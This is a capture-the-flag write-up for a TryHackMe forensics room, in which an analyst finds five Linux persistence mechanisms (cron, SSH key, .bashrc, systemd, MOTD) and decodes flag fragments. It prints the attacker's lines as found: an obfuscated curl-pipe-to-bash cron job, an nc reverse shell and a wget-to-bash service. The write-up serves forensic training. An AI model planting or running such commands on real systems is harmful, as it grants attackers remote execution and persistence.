# TryHackMe — Hide and Seek

### Challenge Link: https://tryhackme.com/room/hfb1hideandseek

## Overview

**Room:** Hide and Seek
**Difficulty:** Easy
**Category:** Forensics

### Objective

Perform live system analysis to identify **five persistence mechanisms** planted by an attacker named **Cipher**.

Each persistence mechanism corresponds to one clue from the attacker's note and contains a fragment of the final flag.

---

## Clues

The attacker left five clues:

1. **“Time is on my side, always running like clockwork.”**
2. **“A secret handshake gets me in every time.”**
3. **“Whenever you set the stage, I make my entrance.”**
4. **“I run with the big dogs, booting up alongside the system.”**
5. **“I love welcome messages.”**

These clues point to five different Linux persistence mechanisms.

---

# 1. Cron Persistence

### Clue

> Time is on my side, always running like clockwork.

The clue points to **cron jobs**.

First, inspect the root user's crontab:

```bash
sudo crontab -l -u root
```

A suspicious entry was found:

```text
* * * * * /bin/bash -c 'echo Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK | base64 -d | bash 2>/dev/null'
```

The Base64 string can be decoded without executing the payload:

```bash
echo 'Y3VybCAtcyA1NDQ4NGQ3Yjc5MzAuc3RvcmFnM19jMXBoM3JzcXU0ZC5uZXQvYS5zaCB8IGJhc2gK' | base64 -d
```

Output:

```text
curl -s 54484d7b7930.storag3_c1ph3rsqu4d.net/a.sh | bash
```

The hexadecimal-looking subdomain contains the first flag fragment:

```bash
echo "54484d7b7930" | xxd -r -p
```

Output:

```text
THM{y0
```

**Flag Part 1:**

```text
THM{y0
```

---

# 2. SSH Persistence

### Clue

> A secret handshake gets me in every time.

This points toward **SSH key-based persistence**.

Search for `authorized_keys` files:

```bash
find /home /root -type f -name authorized_keys -print 2>/dev/null
```

A suspicious file was found:

```text
/home/zeroday/.ssh/.authorized_keys
```

Inspect it:

```bash
sudo cat /home/zeroday/.ssh/.authorized_keys
```

The SSH key contained an unusual encoded comment:

```text
326e6420706172743a20755f6730745f.local
```

Decode the hexadecimal portion:

```bash
echo "326e6420706172743a20755f6730745f" | xxd -r -p
```

Output:

```text
2nd part: u_g0t_
```

**Flag Part 2:**

```text
u_g0t_
```

---

# 3. Shell Startup Persistence

### Clue

> Whenever you set the stage, I make my entrance.

This points toward **shell startup files**, such as `.bashrc`.

Inspect the user's `.bashrc`:

```bash
sudo cat /home/specter/.bashrc
```

A suspicious reverse-shell command was found:

```text
nc -e /bin/bash 4d334a6b58334130636e513649444e324d334a3564416f3d.cipher.io 443 2>/dev/null
```

The encoded portion is hexadecimal.

Decode it:

```bash
echo "4d334a6b58334130636e513649444e324d334a3564416f3d" | xxd -r -p
```

Output:

```text
M3JkX3A0cnQ6IDN2M3J5dAo=
```

This result is Base64 encoded.

Decode it:

```bash
echo "M3JkX3A0cnQ6IDN2M3J5dAo=" | base64 -d
```

Output:

```text
3rd_p4rt: 3v3ryt
```

**Flag Part 3:**

```text
3v3ryt
```

---

# 4. Systemd Persistence

### Clue

> I run with the big dogs, booting up alongside the system.

This points toward a **systemd service**.

List system services:

```bash
ls -la /lib/systemd/system/
```

A suspicious service was found:

```text
cipher.service
```

Inspect the service:

```bash
sudo cat /lib/systemd/system/cipher.service
```

Contents included:

```ini
[Unit]
Description=Safe Cipher Service

[Service]
ExecStart=/bin/bash -c 'wget NHRoIHBhcnQgLSBoMW5nXyAK.s1mpl3bd.com --output - | bash 2>/dev/null'

[Install]
WantedBy=multi-user.target
Alias=cipher.service
```

The encoded portion is Base64.

Decode it:

```bash
echo "NHRoIHBhcnQgLSBoMW5nXyAK" | base64 -d
```

Output:

```text
4th part - h1ng_
```

**Flag Part 4:**

```text
h1ng_
```

---

# 5. MOTD Persistence

### Clue

> I love welcome messages.

This points toward the Linux **Message of the Day (MOTD)** system.

List the MOTD scripts:

```bash
ls -la /etc/update-motd.d/
```

Inspect the header script:

```bash
cat /etc/update-motd.d/00-header
```

A suspicious Python reverse-shell command was found containing:

```text
4c61737420706172743a206430776e7d0.h1dd3nd00r.n3t
```

Extract and decode the hexadecimal portion:

```bash
echo "4c61737420706172743a206430776e7d0" | xxd -r -p
```

Output:

```text
Last part: d0wn}
```

**Flag Part 5:**

```text
d0wn}
```

---

# Flag Reconstruction

The five fragments are:

```text
THM{y0
u_g0t_
3v3ryt
h1ng_
d0wn}
```

Combining them in order:

```text
THM{y0u_g0t_3v3ryth1ng_d0wn}
```

## Final Flag

```text
THM{y0u_g0t_3v3ryth1ng_d0wn}
```

---

# Persistence Mechanisms Summary

| Clue                     | Persistence Mechanism | Location                              | Flag Part |
| ------------------------ | --------------------- | ------------------------------------- | --------- |
| Time / clockwork         | Cron                  | Root crontab                          | `THM{y0`  |
| Secret handshake         | SSH authorized key    | `/home/zeroday/.ssh/.authorized_keys` | `u_g0t_`  |
| Set the stage            | Bash startup          | `/home/specter/.bashrc`               | `3v3ryt`  |
| Booting alongside system | Systemd service       | `/lib/systemd/system/cipher.service`  | `h1ng_`   |
| Welcome messages         | MOTD                  | `/etc/update-motd.d/00-header`        | `d0wn}`   |

---

# Key Takeaways

* Cron jobs can provide recurring persistence.
* SSH `authorized_keys` can be abused for persistent remote access.
* Shell startup files can execute malicious commands whenever a shell starts.
* Systemd services can provide boot-time persistence.
* MOTD scripts can be abused to execute commands during login.
* Attackers may use multiple layers of **Base64 and hexadecimal encoding** to hide payloads.
* During forensic analysis, suspicious commands should be **decoded and inspected rather than executed**.

> **Note:** The malicious `curl | bash`, `wget | bash`, `nc`, and Python reverse-shell commands were analyzed statically. They should not be executed during investigation.